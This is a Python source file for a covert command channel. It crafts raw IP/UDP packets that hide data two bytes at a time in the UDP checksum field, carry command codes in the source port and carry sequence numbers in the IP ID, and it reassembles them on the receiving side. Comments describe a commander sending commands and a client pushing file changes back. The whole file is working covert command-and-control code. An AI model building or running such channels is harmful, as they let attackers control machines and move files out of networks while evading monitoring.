import socket
import struct
import time
import threading

CHUNK_SIZE = 2
FLAG_DATA = 0
FLAG_ACK = 1
FLAG_START = 2
FLAG_END = 3

DUMMY_PAYLOAD = b'\x00' * 4

# Command codes that are valid responses (sent by the client back to the commander).
# receive_data() uses this to ignore the commander's own outbound packets when
# both sides share the same IP (single-machine testing).
RESPONSE_COMMANDS = frozenset([
    0x9ABC,  # ACK
    0xABCD,  # ERROR
    0x6789,  # FILE_WATCH  (client pushing a modified file)
    0x7890,  # FILE_DELETE (client pushing a delete notification)
])


class RawSocketProtocol:
    def __init__(self):
        self.sequence = 0
        self._recv_sock = None
        self._recv_lock = threading.Lock()

    def checksum(self, data):
        if len(data) % 2:
            data += b'\x00'

        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def create_ip_header(self, src_ip, dst_ip, seq, payload_len):
        ver_ihl = (4 << 4) + 5
        tos = 0
        tot_len = 20 + payload_len
        pkt_id = seq
        frag = 0
        ttl = 64
        proto = socket.IPPROTO_UDP

        src = socket.inet_aton(src_ip)
        dst = socket.inet_aton(dst_ip)

        hdr = struct.pack(
            "!BBHHHBBH4s4s",
            ver_ihl, tos, tot_len, pkt_id,
            frag, ttl, proto, 0, src, dst
        )

        chk = self.checksum(hdr)

        return struct.pack(
            "!BBHHHBBH4s4s",
            ver_ihl, tos, tot_len, pkt_id,
            frag, ttl, proto, chk, src, dst
        )

    def build_covert_udp(self, data_chunk, command_type, dst_port, total_chunks):
        udp_len = 8 + len(DUMMY_PAYLOAD)

        src_port = int(command_type)
        covert_len = total_chunks

        covert_checksum = struct.unpack(
            "!H", data_chunk.ljust(2, b'\x00')
        )[0]

        return struct.pack(
            "!HHHH",
            src_port,
            dst_port,
            covert_len,
            covert_checksum
        ) + DUMMY_PAYLOAD

    def _open_recv_socket(self):
        """Open and return a raw UDP receive socket."""
        sock = socket.socket(
            socket.AF_INET,
            socket.SOCK_RAW,
            socket.IPPROTO_UDP
        )
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return sock

    def prepare_recv_socket(self):
        """
        Open the receive socket early so it is ready before send_packet()
        is called. This eliminates the race where the first response packet
        arrives before the receiver is listening.
        """
        with self._recv_lock:
            if self._recv_sock is not None:
                try:
                    self._recv_sock.close()
                except Exception:
                    pass
            self._recv_sock = self._open_recv_socket()

    def send_packet(self, src_ip, dst_ip, dst_port, command_type, data):
        try:
            sock = socket.socket(
                socket.AF_INET,
                socket.SOCK_RAW,
                socket.IPPROTO_RAW
            )
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            # Prefix with original length so receiver can trim padding exactly
            framed = struct.pack('!I', len(data)) + data

            chunks = [
                framed[i:i + CHUNK_SIZE]
                for i in range(0, len(framed), CHUNK_SIZE)
            ]
            total = len(chunks)

            if total == 0:
                chunks = [b'\x00\x00']
                total = 1

            print(f"[*] Sending {total} covert packets")

            for seq, chunk in enumerate(chunks):
                ip_hdr = self.create_ip_header(
                    src_ip,
                    dst_ip,
                    seq + 1,  # start at 1 — kernel overwrites IP ID = 0
                    8 + len(DUMMY_PAYLOAD)
                )

                udp_hdr = self.build_covert_udp(
                    chunk,
                    command_type,
                    dst_port,
                    total
                )

                packet = ip_hdr + udp_hdr
                sock.sendto(packet, (dst_ip, 0))
                time.sleep(0.01)

            sock.close()
            return True

        except Exception as e:
            print(f"[!] send error: {e}")
            return False

    def parse_udp_packet(self, packet):
        if len(packet) < 28:
            return None

        ip = packet[:20]
        udp = packet[20:28]

        iph = struct.unpack("!BBHHHBBH4s4s", ip)
        udph = struct.unpack("!HHHH", udp)

        seq = iph[3]
        src_port, dst_port, length, checksum = udph

        data = struct.pack("!H", checksum)

        return {
            "seq": seq,
            "command": src_port,
            "dst_port": dst_port,
            "total": length,
            "data": data
        }

    def receive_data(self, expected_ip, dst_port, timeout=5):
        """
        Receive reassembled covert data from expected_ip.

        Uses a pre-opened socket (via prepare_recv_socket) if available,
        otherwise opens one now. This avoids the race condition where the
        first packet arrives before the socket is ready.
        """
        with self._recv_lock:
            sock = self._recv_sock
            self._recv_sock = None  # take ownership; we'll close it when done

        if sock is None:
            # Fallback: no pre-opened socket — open one now (may miss first packet)
            print("[!] Warning: receive socket was not prepared in advance — "
                  "first packet may be dropped. Call prepare_recv_socket() before send_packet().")
            sock = self._open_recv_socket()

        sock.settimeout(timeout)

        chunks = {}
        total = None
        last_parsed = None
        start = time.time()

        try:
            while time.time() - start < timeout:
                try:
                    packet, addr = sock.recvfrom(65535)
                except socket.timeout:
                    break

                parsed = self.parse_udp_packet(packet)
                if not parsed:
                    continue

                if parsed["dst_port"] != dst_port:
                    continue

                if addr[0] != expected_ip:
                    continue

                seq = parsed["seq"]
                chunks[seq] = parsed["data"]
                total = parsed["total"]
                last_parsed = parsed

                if total and len(chunks) >= total:
                    break
        finally:
            sock.close()

        # Nothing received
        if not chunks or last_parsed is None:
            return None

        # Verify no sequence gaps
        expected_seqs = set(range(1, total + 1))
        received_seqs = set(chunks.keys())
        if expected_seqs != received_seqs:
            missing = expected_seqs - received_seqs
            print(f"[!] Missing sequences: {missing} — payload may be corrupt")

        # Reassemble in order
        ordered = b''.join(chunks[i] for i in sorted(chunks))

        # First 4 bytes are the original payload length written by send_packet
        if len(ordered) < 4:
            return None
        orig_len = struct.unpack('!I', ordered[:4])[0]
        ordered  = ordered[4:4 + orig_len]

        return {
            "type": last_parsed["command"],
            "payload": ordered
        }